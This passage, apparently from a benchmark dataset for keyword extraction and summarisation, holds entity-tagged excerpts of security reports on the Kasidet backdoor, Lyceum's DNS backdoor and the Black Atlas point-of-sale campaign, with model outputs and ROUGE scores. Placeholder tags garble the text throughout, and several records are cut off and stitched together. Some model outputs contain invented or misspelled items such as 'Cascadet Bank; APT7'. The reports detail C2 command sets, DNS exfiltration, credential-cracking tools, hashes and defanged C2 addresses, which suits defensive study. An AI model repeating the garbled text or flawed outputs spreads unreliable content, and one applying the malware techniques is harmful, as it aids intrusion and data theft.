[CARDINAL] 1 ) Flash vulnerabilities ( [CARDINAL] 5 ) Flash vulnerability ( [CARDINAL] 3 ) Google [PERSON] Cloud [PERSON] Server ( [CARDINAL] 1 ) Google code ( [CARDINAL] 1 ) Google Play store ( 1 ) H - Worm ( 1 ) Hacking Team ( [CARDINAL] 3 ) iframe trampolining ( [CARDINAL] 1 ) incognito ( [CARDINAL] 1 ) infected ( [CARDINAL] 32)Upon successful infection , [ORG] Kasidet sends a [ORG] HTTP [ORG] POST request with data \u201c enter=1 \u201d ( without quotes ) . All HTTP header fields ( [ORG] User - Agent , Content - type and Cookie ) are hard coded in the payload itself . Kasidet \t [ORG] C&C \t listKasidet \t Hardcoded \t HTTP \t \ufb01elds [ORG] C&C [ORG] Server will not return required data if HTTP header fields are different . The server sends a fake [CARDINAL] 404 response code and html data stating that page is not found but the [ORG] C&C commands will be hidden in the response HTML comment tag as seen below : Kasidet - \t [ORDINAL] First \t communica(cid:39)on \t with C&CKasidet will request for additional commands from the [ORG] C&C server with the following [ORG] POST request : Information Disclosure Vulnerability(1)Information [PERSON] Stealer ( [CARDINAL] 1 ) information stealing ( [CARDINAL] 2 ) Infostealer ( [CARDINAL] 2 ) internet explorer ( [CARDINAL] 18 ) iOS ( [CARDINAL] 5 ) IRC Botnet ( [CARDINAL] 1 ) [NORP] iTunes ( [CARDINAL] 1 ) itunes app store ( [CARDINAL] 1 ) [PERSON] Java [PERSON] Vulnerability ( 1 ) [PERSON] Kelihos [PERSON] Botnet ( 1 ) lock out malware ( [CARDINAL] 1 ) lollipop ( [CARDINAL] 1 ) Machine Translation ( 1 ) Magnitude ( [CARDINAL] 2 ) malcious [ORG] JavaScrip ( [CARDINAL] 2 ) malcious [ORG] JavaScript ( [CARDINAL] 11 ) Malicious [ORG] APK ( [CARDINAL] 1 ) Malicious Code ( [CARDINAL] 24 ) Malicious Document ( [CARDINAL] 1 ) malicious [PERSON] JavaScript ( 8) March Madness ( [CARDINAL] 1 ) MediaFire ( [CARDINAL] 1 ) [PERSON] Microsoft [PERSON] Word ( [CARDINAL] 1 ) mobile ( [CARDINAL] 10 ) [GPE] Mobile apps category ( [CARDINAL] 1 ) mobile malware ( [CARDINAL] 3 ) [PERSON] Mobile [PERSON] Porn ( [CARDINAL] 1 ) MS06 - 014 ( [CARDINAL] 1 ) Nuclear Exploit Kit ( 4 ) OS X ( [CARDINAL] 1 ) [ORG] PDF exploits ( [CARDINAL] 5 ) pharm ( 2)Kasidet request \t for \t addi(cid:39)onal \t commands [PRODUCT] Variable [PRODUCT] Descriptions [ORG] wCommand . It is hardcoded in the malware payload as ' 1 ' . MachineGuid value fetched from Software\\Microsoft\\Cryptography registry key [PERSON] System [PERSON] Name [PERSON] Operating system version Process elevation status Antivirus installed on the infected system Version of the bot . It is hardcoded in the malware . Current version that we analysed is [CARDINAL] 4.4 Flag that indicates whether the system locale and [ORG] UserGeoID is [PERSON] RussiaLike browser names , all the command strings are also encrypted using a hash function . Below are some of the important commands : [PERSON] Command [PERSON] Hash 0x0E587A65 ( rate < number > ) [ORG] 0CAB1E64A0x10E6C4It is used in sleep [PERSON] functionDescriptionDDOS using HTTP protocol Start keylogging and screen capture threads [PERSON] Download and execute additional component . This file can be [ORG] DLL , [ORG] EXE or [PERSON] VBS . Search for given process name in current running processes in the system Find given file in system and upload to the server [ORG] Drop setting.bin file , change firewall settings to download and execute plugin component [ORG] Execute given command using windows cmd.exeConclusion Malicious Office document file is a popular vector for malware authors to deliver their payloads . Dridex authors have leveraged this technique for over a year and it was interesting to see the same campaign and URLs being leveraged to deliver [ORG] Kasidet payloads . While this does not establish any links between the [CARDINAL] two malware family authors , it reaffirms the fact that a lot of the underlying infrastructure and delivery mechanisms are often shared by these cyber criminals . [ORG] ThreatLabZ is actively monitoring this threat and ensuring signature coverage for [ORG] Zscaler customers . Analysis by - Abhay Yadav , [PERSON] Avinash [PERSON] Kumar and [PERSON] Nirmal [PERSON] SinghMPLOST [PERSON] Recommend this on Google OADTCLEIMHUSDOCUMENTINOCOMMENTS : Post a CommentNewer PostHomeOlder PostSubscribe to : [ORG] Post [ORG] Comments ( Atom)phishing ( [DATE] 32 ) [PERSON] Porn [PERSON] Droid ( 1 ) Potentially Unwanted Application ( [CARDINAL] 1 ) quikr mobile app ( [CARDINAL] 1 ) reverse engineering ( 7 ) Rig ( [CARDINAL] 2 ) [ORG] RIG [ORG] EK ( [CARDINAL] 2 ) Rogue software ( [CARDINAL] 7 ) security features ( [CARDINAL] 1 ) SEO ( [CARDINAL] 58 ) Shaadi.com app ( [CARDINAL] 1 ) Signed malware ( 2 ) SilverLight ( [CARDINAL] 2 ) SilverLight vulnerability ( [CARDINAL] 1 ) skype ( [CARDINAL] 3 ) SMS stealer ( [CARDINAL] 3 ) SMS trojan ( [CARDINAL] 2 ) [ORG] Spy [ORG] Banker [ORG] Telax ( [CARDINAL] 1 ) storm worm ( 1 ) Style tag ( [CARDINAL] 1 ) [DATE] Thanksgiving scam ( 1 ) Threat Finder ( [CARDINAL] 1 ) Traffic Analysis ( [CARDINAL] 2 ) UDID ( [CARDINAL] 1)Upatre ( 2 ) Youdao Dictionary ( [CARDINAL] 1 )   ( [CARDINAL] 1)UTUSBA Uday [NORP] Pratap Singh [PERSON] Michael SuttonP O S T SC O M M E N T SSUBSCRIBETO", "generated_text": "Kasidet; Dridex Banking Trojan; Office documents; spear phishing emails; the malware; a new folder; The name; Y1FeZFVYXllb; the malware; a Registry key; persistence; system reboot; a registry key; a registry key; persistence; system reboot; analysis; the Kasidet variant; malware samples; Windows APIs; Dubugger; Windows checks; Windows APIs; data; obfuscation; the embedded malware; a registry key; persistence; the system; a registry key; persistence; the registry; the malware; Cascadet Bank; APT7; a GET request; the malware; Kasidet code; the malware.", "ref_text": "<START-1>Zscaler ThreatLabZ analyzed a malicious Office document campaign delivering both Dridex banking trojan and Kasidet backdoor. The macro inside the Office document downloads the malware payload from URLs hosted on compromised sites. Kasidet installs itself in the appdata folder and uses anti-VM checks to avoid sandboxes. It steals data via memory scraping and browser hooking, sending it to a C2 server. The browser hooking injects code into Firefox, Chrome, and IE to steal sensitive data from these browsers. Network communication uses hardcoded HTTP headers and encrypted C2 commands. Locale checks disable theft from Russian systems. Dridex is also delivered by the same macro document. The shared infrastructure shows criminals reuse delivery mechanisms. Zscaler recommends blocking the identified C2 domains and IOCs listed. The campaign shows blended threats combining banking trojan and backdoor for maximum monetization. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.46288209606986896, "gpt3/lexical/rouge_rouge2": 0.15859030837004406, "gpt3/lexical/rouge_rougeL": 0.25327510917030566, "gpt3/lexical/rouge_rougeLsum": 0.25327510917030566, "gpt3_generated_text": ["This article discusses the recent discovery of Office documents containing malicious VBA macros that are being used to drop both the Kasidet backdoor and the Dridex banking Trojan on infected systems. These malicious documents are being spread through spear-phishing emails. The VBA macro in the Office document is obfuscated and downloads the malware payload from a hardcoded URL. The Kasidet variant installs itself into the %APPDATA% folder and creates a new folder with the name \"Y1FeZFVYXllb\" for persistence upon system reboot. The malware also includes anti-VM checks to detect analysis systems."]}, {"split_name": "test", "sample_id": "test_2", "prompt_text": "Extract the keywords: www.zscaler.com /blogs / security - research / lyceum - net - dns - backdoor [ORG] Lyceum .NET DNS BackdoorActive since [DATE] 2017 , [ORG] Lyceum group is a state - sponsored [ORG] Iranian [ORG] APT group that is known for targeting [LOC] Middle [LOC] Eastern organizations in the energy and telecommunication sectors and mostly relying on .NET based malwares . [ORG] Zscaler [ORG] ThreatLabz recently observed a new campaign where [ORG] the [ORG] Lyceum [ORG] Group was utilizing a newly developed and customized .NET based malware targeting [LOC] the [LOC] Middle [LOC] East by copying the underlying code from an open source tool . [ORG] Key [ORG] Features of this attack:1 . The new malware is a .NET based [ORG] DNS [ORG] Backdoor which is a customized version of the opensource tool \u201c DIG.net\u201d2 . The malware leverages a [ORG] DNS attack technique called \" DNS Hijacking \" in which anattacker- controlled [ORG] DNS server manipulates the response of [ORG] DNS queries and resolve them as per their malicious requirements.3 . The malware employs the [ORG] DNS protocol for command and control ( C2 ) communication whichincreases stealth and keeps the malware communication probes under the radar to evade detection.4 . Comprises functionalities like [ORG] Upload / Download [ORG] Files and execution of system commands on the infected machine by abusing [ORG] DNS records , including [ORG] TXT records for incoming commands and A records for data exfiltration . Delivery mechanismDuring this campaign , the macro - enabled Word document ( [PERSON] File name : ir_drones.docm ) shown below is downloaded from the domain \u201c http[:]//news - spot.live \u201d disguising itself as a news report related to military1/13affairs in [GPE] Iran . The text of the document is copied from the following original report here : https[:]//www[.]rferl[.]org / a / iran - drone - program - threats - interests/31660048.htmlFig [CARDINAL] 1 . [PERSON] Attached Macro [PERSON] - enabled Word DocumentOnce the user enables the macro content , the following [ORG] AutoOpen ( ) function is executed which increases picture brightness using \u201c [PRODUCT] PictureFormat . Brightness = [CARDINAL] 0.5 \u201d revealing content with the headline , \u201c [WORK_OF_ART] Iran [WORK_OF_ART] Deploys [WORK_OF_ART] Drones [WORK_OF_ART] To [WORK_OF_ART] Target [WORK_OF_ART] Internal Threat , [WORK_OF_ART] Protect [WORK_OF_ART] External [WORK_OF_ART] Interests . \u201dFig [CARDINAL] 2 . [ORG] AutoOpen ( ) function revealing content to lure the victimsThe threat actor then leverages the [PRODUCT] AutoClose ( ) function to drop the [ORG] DNS backdoor onto the system . Upon closing the document the [PRODUCT] AutoClose ( ) function is executed , reading a [ORG] PE file from the text box present on the [ORDINAL] 7th page of the word document and parsing it further into the required format as shown below with the \u201c MZ \u201d header as the initial [CARDINAL] two bytes of the byte stream.2/13Fig 3 . AutoClose ( ) function reading [ORG] the [ORG] PE [ORG] FileThis [ORG] PE file is then further written into the [PRODUCT] Startup folder in order to maintain persistence via the macro code as shown below in the screenshot . With this tactic , whenever the system is restarted , [ORG] the [ORG] DNS [ORG] Backdoor is executed . [PERSON] Fig [PERSON] 4 . [ORG] DNS [ORG] Backdoor dropped in the [WORK_OF_ART] Startup folderThe dropped binary is a .NET based DNS Backdoor named \u201c [ORG] DnsSystem \u201d which allows the threat actors to execute system commands remotely and upload / download data on the infected machine . Below , we analyze the dropped .NET based [ORG] DNS [ORG] Backdoor and its inner workings . Lyceum .NET [ORG] DNS backdoor3/13The [ORG] Lyceum [ORG] Group has developed a .NET based [ORG] DNS [ORG] Backdoor which has been widely used in the wild in their recent campaigns . As discussed earlier , the backdoor was dropped in the [PRODUCT] Startup folder of the here : DNS.NET Resolver ( C # ) - CodeProject . DIG.net is an open source [PRODUCT] DNS [PRODUCT] Resolver which can be leveraged to perform [ORG] DNS queries onto [ORG] the [ORG] DNS [ORG] Server and then parse the response . The threat actors have customized and appended code that allows them to perform [ORG] DNS queries for various records onto the custom [ORG] DNS [ORG] Server , parse the response of the query in order to execute system commands remotely , and upload / download files from the [ORG] Command [ORG] & [ORG] Control server by leveraging the [ORG] DNS protocol . Initially the malware sets up an attacker controlled [ORG] DNS server by acquiring the IP Address of the domain name \u201c cyberclub[.]one \u201d = [CARDINAL] 85[.]206[.]175[.]199 using [ORG] Dns . GetHostAddresses ( ) for the [ORG] DIG [ORG] Resolver function , which in turn triggers an [ORG] DNS request to cyberclub[.]one for resolving the [ORG] IP address . Now this [ORG] IP is associated as the custom attacker controlled [ORG] DNS Server for all the further [ORG] DNS queries initiated by the malware . Fig 5 . [PERSON] Initialize Attacker [PERSON] - Controlled [ORG] DNS ServerNext , the [PRODUCT] Form [PRODUCT] Load function generates a unique BotID depending on the current [PRODUCT] Windows username . It converts the username into its MD5 equivalent using the [PERSON] CreateMD5 ( ) function , and parses the [ORDINAL] first 8 bytes of the MD5 as the [ORG] BotID for the identification of the user and system infected by [LAW] the [LAW] malware.4/13Fig [LAW] 6 . Generation of BotID using the Windows usernameNow , the backdoor needs to receive commands from the [CARDINAL] C2 server in order to perform tasks . The backdoor sends across an initial [ORG] DNS query to \u201c trailers.apple.com \u201d wherein the domain name \u201c trailers.apple.com \u201d is concatenated with the previously generated [ORG] BotID before initiation of the [ORG] DNS request . The [ORG] DNS query is then sent to the [ORG] DNS server in order to fetch the \u201c TXT \u201d records for the provided domain name by passing [CARDINAL] three arguments to the [GPE] BeginDigIt ( ) function : Name : Target Domain name - EF58DF5Ftrailers.apple.com qType : Records to be queried - TXT qClass : Dns class value - IN ( default)Fig 7 . Setup of [ORG] DNS [ORG] Query parameters before execution of [PERSON] BeginDigIt ( ) [ORG] FunctionThe [PRODUCT] BeginDigIt function then executes the main [ORG] DNS resolver function \u201c [PERSON] DigIt . \u201d This sends across the [ORG] DNS query in order to fetch the [ORG] DNS record for the provided target domain name to the [ORG] DNS server , and parses the response as seen in the code snippet below . [PERSON] Fig [PERSON] 8 . [ORG] DNS [PERSON] Query [PERSON] DigIt Function5/13Comparing the Digit Resolver Code DigIt ( ) function strings with the Dig . Net tool output from the screenshot shown below provides us further assurance that the Dig . Net tool has been customized by [ORG] the [ORG] Lyceum [ORG] Group to develop the following .Net based [ORG] DNS backdoor [ORG] Fig 9 . Original Dig.net [ORG] GUI OutputThe malware utilizes a [ORG] DNS attack technique known as \u201c DNS Hijacking \u201d where in the [ORG] DNS server is being controlled by the attackers which would allow them to manipulate the response to the [ORG] DNS queries . Now let 's analyze the [ORG] DNS [ORG] Hijacking routine below . As discussed earlier , the backdoor performs initial [ORG] DNS queries in order to fetch the [ORG] TXT records for the domain [ORG] EF58DF5trailers.apple.com . [ORG] EF58DF5 is the [ORG] BotID generated based on the [PRODUCT] Windows user to receive commands from the C2 server.6/13Fig 10 . [ORG] DNS query to attacker - controlled [ORG] DNS server to fetch TXT records . As can be seen in the above screenshot , a [ORG] DNS query is performed to fetch the [ORG] TXT records for the domain name : EF58DF5trailers.apple.com to the DNS Server : [CARDINAL] 85[.]206[.]175[.]199 which is the attacker- controlled [ORG] DNS server previously initialized . Here \u2019s where the [ORG] DNS hijacking happens : As the malware sends across a [ORG] DNS query to fetch the [ORG] TXT records to the attacker - controlled [ORG] DNS server , the attacker controlled [ORG] DNS server responds with an incorrect response consisting of the commands to be executed by the backdoor such as ipconfig , whoami , uploaddd etc as shown in the screenshot below . [PERSON] Fig 11 . Ipconfig command returned as the [ORG] TXT record from the attacker controlled [ORG] DNS serverFollowing is the DIG.Net [ORG] DNS response received by the backdoor and then further parsed in order to execute commands on the infected [LAW] machine.7/13Fig [LAW] 12 . DIG.net output received by the backdoorThe above screenshot consists of the [ORG] DNS query performed to the attacker controlled [ORG] DNS server along with the target domain name [ORG] EF58DF5trailers.apple.com . The Answer section consists of the query response , which includes the target Domain name and the response to the TXT record with [CARDINAL] two values , \u201c ipconfig \u201d - command to be executed and \u201c [DATE] 1291 \u201d - Communication IDNext , the Dig.net response is parsed using multiple pattern regex code routines which parse out the TXT record values \u2014 the aforementioned command and communication ID \u2014 from the complete response received by the malware . [PERSON] Fig 13 . Parsing of TXT RecordsNext , depending on the command received in the TXT record from the [CARDINAL] C2 server , there are [CARDINAL] three functions which can be performed by the [ORG] Lyceum backdoor : Download [PERSON] Files [PERSON] - If the command received from the [ORG] DNS query consists of a string : \u201c downloaddd \u201d it initiates the download routine and downloads the file from the URL using DownloadFileAsync ( ) . The URL would be the [ORDINAL] first 11 bytes of the TXT record response value , and stores that downloaded file in the [GPE] Downloads folder as shown below in the code snippet . This functionality can be leveraged to drop additional malware on the infected machine.8/13Fig 14 . Backdoor Download RoutineUpload Files - If the command received from the [ORG] DNS query consists of a string : \u201c uploaddd \u201d , it uploads the local file on the disk using UploadFileAsync ( ) function to an External URL after parsing the TXT record response value into [CARDINAL] two variables : uriString ( external URL ) and filename ( [PERSON] Local [PERSON] File ) . This functionality can be leveraged to exfiltrate data . [PERSON] Fig [CARDINAL] 14 . [ORG] Backdoor [ORG] Upload [ORG] RoutineCommand [ORG] Execution - If none of the above strings match the [ORG] TXT record response then the response is passed on to the [ORG] Command execution routine . There , the response to the txt record is executed as a command on the infected machine using \u201c cmd.exe /c < txt_record_response_command > \u201d and the command output is sent across to the [CARDINAL] C2 server in the form of [ORG] DNS A Records.9/13Fig [CARDINAL] 15 . [ORG] Backdoor [ORG] Command Execution RoutineIn this case , the TXT record response we received for the [ORG] DNS query performed against the attacker controlled [ORG] DNS server is \u201c ipconfig \u201d . This response initiates the [ORG] Command execution routine of the backdoor and thus the command \u201c ipconfig \u201d would be executed on the infected machine - cmd.exe /c ipconfigFurther , the command output is exfiltrated to the [CARDINAL] C2 server , encoded in [GPE] Base64 and then concatenated with [ORG] the [ORG] Communication [ORG] ID and the previously generated BotUID using \u201c $ \u201d as the separator . [PERSON] Fig [CARDINAL] 16 . [ORG] Command [PRODUCT] Output [PRODUCT] exfiltration [PRODUCT] Pattern setupData [ORG] Exfil [ORG] Pattern : [ base64encoded_command_output]$[communication_id]$[Bot_ID]10/13Once the command output is encoded in the above mentioned pattern , the [ORG] DNS backdoor then sends across the output to the [CARDINAL] C2 server via [ORG] DNS query in the form of A records in multiple blocks of queries , where the A record values consists of the encoded command output . Once the command output is transmitted completely , an \u201c Enddd \u201d command is sent across in a Base64 - encoded data exfil pattern to notify the end of the command output as shown below in the screenshot . [PERSON] Fig [CARDINAL] 17 . [ORG] Exfiltration [ORG] of [ORG] Encoded [ORG] Command Output via A records queries on the attacker controlled [ORG] DNS serverDecoded A Records : [ORG] IPConfig [ORG] Command Output -Encoded A record = ICAgSVB2NCBBZGRyZXNzLiAuIC4gLiAuIC4gLiAuIC4gLiAuIDogMTkyLjE2OC4.yLjEw$929$5686BB2FDecoded A record = against their targets . Attackers continuously embrace new anti - analysis tricks to evade security solutions ; re - packaging of malware makes static analysis even more challenging . The Zscaler ThreatLabz team will continue to monitor these attacks to help keep our customers safe . MITRE [PERSON] ATT&CK mapping : [ORG] T1059 [ORG] Command and Scripting Interpreter T1055 Process Injection T1562 Disable or Modify Tools T1010 Application Window Discovery T1018 Remote System Discovery T1057 [PRODUCT] Process [PRODUCT] Discovery T1518 Security Software Discovery", "generated_text": "the document; a new campaign; Lyceum; a state-sponsored Iranian APT; the energy and telecommunication sectors; part; the Middle East; the malware; DNS Hijacking; DNS records; stealth; the malware; upload/download files; system commands; the command; DNS Hijacking; anattacker-controlled DNS server; DNS queries; response; DNS queries; the response; detection; Figure; the macro code; the DNS; the backdoor; a PE file; persistence; the startup folder; DnsSystem; the system; the use; a customized version; DNS Hijacking; the malware; the command; control; the infrastructure; the domain; the Middle East.", "ref_text": "<START-1>The document analyzes a new campaign by the Iran-based threat actor group Lyceum, which targeted Middle Eastern organizations. The initial attack vector was a Word document macro that downloaded and executed a .NET-based DNS backdoor malware. The backdoor is a customized version of an open source DNS tool, modified to leverage DNS hijacking for command and control. It configures a malicious DNS server, generates a bot ID from the victim username, and sends DNS queries containing commands, which the malicious DNS server responds to with data exfiltration. The backdoor's capabilities include downloading additional payloads, uploading files, and executing system commands. It encodes and exfiltrates the command output in DNS requests to the attacker-controlled server. The threat actors spoofed an Iranian military news website to distribute the macro document. The .NET malware shows the group's continued effort to refine tactics like leveraging DNS traffic for stealthy command and control. The report provides indicators of compromise like file hashes, domain names, and patterns used in crafting malicious DNS queries. It demonstrates how adversaries modify publicly available tools and use standard protocols to avoid detection. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5016722408026756, "gpt3/lexical/rouge_rouge2": 0.16161616161616163, "gpt3/lexical/rouge_rougeL": 0.27424749163879597, "gpt3/lexical/rouge_rougeLsum": 0.27424749163879597, "gpt3_generated_text": ["The article discusses a new campaign by the state-sponsored Iranian APT group, Lyceum, targeting organizations in the energy and telecommunication sectors in the Middle East. The group has developed a customized.NET based malware, a DNS Backdoor, which utilizes DNS Hijacking to manipulate DNS queries and execute system commands and upload/download files on infected machines. The malware is delivered through a macro-enabled Word document and maintains persistence by dropping the backdoor in the startup folder. The backdoor establishes an attacker-controlled DNS server and communicates with the command and control server using the DNS protocol. This sophisticated attack infrastructure poses a significant threat to organizations in the Middle East."]}, {"split_name": "test", "sample_id": "test_3", "prompt_text": "Extract the keywords: A [NORP] TrendLabs ReportOperation Black AtlasHow Modular Botnets are Used in PoS AttacksTrendLabs Security [PERSON] Intelligence [PERSON] Blog [PERSON] Jay [PERSON] Yaneza and [ORG] Erika [ORG] Mendoza [ORG] Trend [ORG] Micro [ORG] Cyber [ORG] Safety [ORG] Solutions [ORG] Team December 2015Trend Micro | Operation Black Atlas : How Modular Botnets are Used in AttacksContentsIntroduction 3Technical Details 3Probing and [ORG] Penetrating [ORG] the [ORG] Environment 3Point - [ORG] of - Sale [ORG] Threats [ORG] 5New [ORG] Items in NewPosThings [CARDINAL] 7Use of Known PoS Malware Threats 10Gorynych or [ORG] Diamond [ORG] Fox [ORG] 13Spy Net [ORG] RAT 20Victimology [MONEY] 21Attribution [MONEY] 23Conclusion [MONEY] 25TREND [MONEY] MICRO [MONEY] LEGAL DISCLAIMERThe information provided herein is for general information and educational purposes only . It is not intended and should not be construed to constitute legal advice . The information contained herein may not be applicable to all situations and may not reflect the most current situation . Nothing contained herein should be relied on or acted upon without the benefit of legal advice based on the particular facts and circumstances presented and nothing herein should be construed otherwise . [ORG] Trend [ORG] Micro reserves the right to modify the contents of this document at any time without prior notice . Translations of any material into other languages are intended solely as a convenience . Translation accuracy is not guaranteed nor implied . If any questions arise related to the accuracy of a translation , please refer to the original language official version of the document . Any discrepancies or differences created in the translation are not binding and have no legal effect for compliance or enforcement purposes . Although [ORG] Trend [ORG] Micro uses reasonable efforts to include accurate and up - to - date information herein , [ORG] Trend [ORG] Micro makes no warranties or representations of any kind as to its accuracy , currency , or completeness . You agree that access to and use of and reliance on this document and the content thereof is at your own risk . [ORG] Trend [ORG] Micro disclaims all warranties of any kind , express or implied . Neither [ORG] Trend [ORG] Micro nor any party involved in creating , producing , or delivering this document shall be liable for any consequence , loss , or damage , including direct , indirect , special , consequential , loss of business profits , or special damages , whatsoever arising out of access to , use of , or inability to use , or in connection with the use of this document , or any errors or omissions in the content thereof . Use of this information constitutes acceptance for use in an \u201c as is \u201d condition . [ORG] Trend [ORG] Micro [ORG] | [ORG] Operation [ORG] Black [ORG] Atlas : How Modular Botnets are Used in AttacksIntroductionOur analysis of [ORG] Black [ORG] Atlas has given us a lot of information on the tools used by cybercriminals their operations , as well as how they utilize these tools in targeting PoS systems . We learned about their methods of initial compromise as well as how they use pen - testing tools to gain further access into the network . We also found Gorynych \u2014 a modular botnet client that was retrofitted to use BlackPOS and target PoS systems , as well as a variety of other tools that the Black Atlas operators used to penetrate networks . In this report , we will look further into these tools and techniques , how they work , and what network administrators can do to protect their networks against these threats . Technical DetailsProbing and Penetrating the EnvironmentThrough the use of [ORG] the [ORG] Trend [ORG] Micro \u2122 [ORG] Smart [ORG] Protection [ORG] Network \u2122 , we have been able to determine that the attackers used several tools to probe and compromise an [ORG] IP address list : Tool NameWhy and when is it used?Medusa [ORG] Parallel [ORG] Network Login [ORG] AuditorEnumerates services and tries to authenticate via brute force method . Supports multiple protocols . Simple SMTP Scanner Used to fingerprint a remote SMTP server and guess which mail software is used on a remote server . Though most environments are firewalled , the name of the service that answers on a known port may provide more context of the underlying network infrastructure hidden behind the firewall . Fast SYN ScannerScans port on a given range of hosts , using a specified interface , to see which host would respond back from a [ORG] TCP SYN packet.nVNC Scanner packageCan take a combination of [ORG] IPs , and try a list of passwords to authenticate on a [ORG] VNC port.nCrackHigh - speed network authentication cracking tool . Supports multiple protocols.nPCA [NORP] BruterScans port on a given range of hosts.3Trend Micro | Operation Black Atlas : How Modular Botnets are Used in AttacksFast RDP [GPE] Brute GUI v2.0 packageScans for a list of [ORG] IP addresses and uses a user name / password combination for authentication . Sentry MBA Universal Crack / bruteforceUniversal HTTP dictionary brtueforcer / cracking tool . Highly configurable . RealVNC viewer [CARDINAL] 5.2.3 [CARDINAL] One a [ORG] VNC is exposed , simple use [PRODUCT] VNC [PRODUCT] Viewer to attempt to connect to the port . Cain and [ORG] AbelPassword recovery tool for [ORG] the [ORG] Microsoft [ORG] Operating [ORG] System . Allows recovery of various passwords by sniffing the network , cracking encrypted passwords using dictionary , brute- force , etc . RDP Scanner XScans for a list of [ORG] IP addresses and uses a username / password combination for authentication . After gaining access to the initial host , the attacker now uses these tools to move further within the network : Tool nameWhy and when is it used?Advanced [ORG] IP [ORG] ScannerFree , fast and easy to use [ORG] IP scanner , used to identify internal hosts . RadminA popular remote control software alternative to the default [ORG] Remote [ORG] Desktop . Can be planted on other hosts to further penetrate within the network . PushVNC packageOnce inside a network , can be used to remotely push and start the [ORG] VNC service . FgdumpDamewareVNC [PERSON] Password [PERSON] Recovery ToolNewer version of pwdump tool for extracting [ORG] NTLM and LanMan password hashes from Windows . Dameware , like [PRODUCT] Radmin , is a popular remote control software alternative to the default [ORG] Remote [ORG] Desktop . Can be planted on other hosts to further penetrate within the network . A small utility that can recover passwords stored by the [ORG] VNC application.4Trend Micro | Operation Black Atlas : How Modular Botnets are Used in AttacksxDedic RDP PatchRDP Patcher Can create a new local account that can be used if the initially compromised account has changed passwordsPoint - of - Sale ThreatsApparently , the website we wrote about earlier was n't the only one that distributed CenterPOS and [EVENT] Katrina . Activity on that cybercriminals \u2019 toolbox had slowed down around the time we wrote about it , and they have set up shop somewhere else . Here are other contents that we found : Original NameSHA1SizeTM DetectionNotes32.exe64.exe007c82ee41939459e1bc84 3097e1a56287cd86bd169984TSPY_POSNEWT.SMA27e99e527914eca78b851b b9f2a4d0441d26e7e3194048TSPY64_POSNEWT.SM32 - bit [CARDINAL] 5575ad11357c6727b6335BAT_NEUTRINO.BDownloads and installs b+.exeAutoExe1.batcb98f62327cb998edacbd93 c471494346d6ffdb2423BAT_NEUTRINO.BAbt.exeb+.exebc7618bfc3a80ea89f52362 baa230ee87a24ca3f87040BKDR_NEUTRINO.SM60b679361db8413060cce8 ad901006d5ecdf0d2184664TROJ_GEN.R047C0DIN15Downloads and installs [ORDINAL] 32.exe and [CARDINAL] 64.exeNeutrino / KASIDE T ( w / POS)Neutrino / KASIDE T ( w / POS)CenterPoint.ex [PERSON] ef9b4451988f4dfbaf918a5a3 [PERSON] 2c7976da89377fd271168BKDR_CENTERPOS.ACenterPOSklg.exe81672ade63280796b8848 350fd819f3b63d3d975101888TSPY_KEYLOGR.UKey logger -- saves logs to % userprofile%\\w5Trend Micro | Operation Black Atlas : How Modular Botnets are Used in AttacksKTNC.exea8cca3c64065961d3f8f47f 1e40553a525590450159232BKDR_ALINA.POSKATrecon.exec2974699bfc215501614bf8 8379da446d84baeb24852488SPYW_CCVIEWstart.exe150cd61abaf54de3ba768f0 14cb4b3e9b9b954fa47616TROJ_POSLOAD.AX.bat08882799c720b54d44108 dd095baa9457d342da5738BAT_CENTERPOS.Blnsys.infAlina ( Katrina)Cardholder [ORG] Data scans files on for credit card centerpoint.exeComparing the files that were found previously , this is definitely an upgrade from their previous approach . Let 's start with the one of the batch files in use , [ORG] AutoExe1.bat:6Trend [ORG] Micro | Operation Black Atlas : How Modular Botnets are Used in [ORG] AttacksSome observations from [FAC] AutoExe1.bat:1.2.3.It uses bitsadmin.exe to download the files that would load [GPE] NewPOSThings . [ORG] Background [ORG] Intelligent [ORG] Transfer [ORG] System ( BITS ) usually comes into play when the operating system downloads updates from [ORG] Microsoft of the local [ORG] WSUS server . But it can be used to download files such as the malware shown above . The method of downloading malware through BITSADMIN has been talked about since [DATE] as [DATE] early [DATE] as [DATE] 2013.It now clears the system events to cover tracks . It also has [CARDINAL] one call to delete AutoExe.bat . This last instruction appears to be a typo , since it deleted AutoExe1.bat instead . There is an AutoExe.bat , but it loaded [ORG] the Neutrino [ORG] / Kasidet variant that had PoS functionality . The batch file has a very similar approach for loading this particular Neutrino [ORG] / Kasidet variant . Both batch files combined [CARDINAL] two batch files from the previous approach that they had \u2014 namely [ORG] Setup.bat and ClearEventN.bat . There are some files that seem to be reused in this toolbox though , like recon.exe , [PERSON] X.bat ( though they removed the [ORG] Dropbox download location ) , as well as the binaries of CenterPOS and [GPE] NewPoSThings . The differences , however , do not stop there . New Items in NewPosThingsThere were n\u2019t many changes done to the [GPE] NewPoSThings malware from a technical standpoint . With the discovery of the [CARDINAL] 64 - bit variants and the usage of v3.0 [DATE] last [DATE] April , version [CARDINAL] 3.0 and [CARDINAL] 64 - bit malware types became more commonplace to the point that we rarely see the version 2.x anymore . SHA1TM DetectionC&Cc3732c425d41b68150e0eb37 2d860a6ce1398973TSPY_POSNWT.SMAhxxp://chiproses[.]net / connect/ 3f96bacd550e8f113134980cde3 [CARDINAL] 3eecfa6da3ebe5TSPY_POSNEWT.SMAhxxp://46.161.30[.]200 / b / con nect/2Version3.03.07Trend Micro | Operation Black Atlas : How Modular Botnets are Used in Attackscfe25d6e4b994b8f07fdfc197c8 f0b2081df4d5bTSPY_POSNEWT.SMAhxxp://chiproses[.]net / connect/ [CARDINAL] 429051ca6c3e0c21065f2cbce8b fa2926f6d95fbdTSPY_POSNEWT.SMAhxxp://chiproses[.]net / connect/ [CARDINAL] 3be465199accbcTSPY64_POSNEWT.ZSShxxp://corner- update[.]net / connect/6hxxp://corner- update[.]net / connect/677dc1389835f48454ef5d83d3 aa3a424eac54a8eTSPY_POSNEWT.SMAhxxp://178.32.130[.]54 / connec t/30868af41f7279a8cee499bdbb1 00084564e1aaffTSPY_POSNEWT.SMAhxxp://179.43.128[.]69 / connec t/34ee213576bf936e8df31c725ab 13ab9fa5dbea72TSPY64_POSNEWT.Bhxxp://46.161.30[.]200 / b / con [CARDINAL] 38ef243fbf7ef6afTSPY_POSNEWT.SMAhxxp://jtrho[.]net / connect/93.0007c82ee41939459e1bc8430 [CARDINAL] 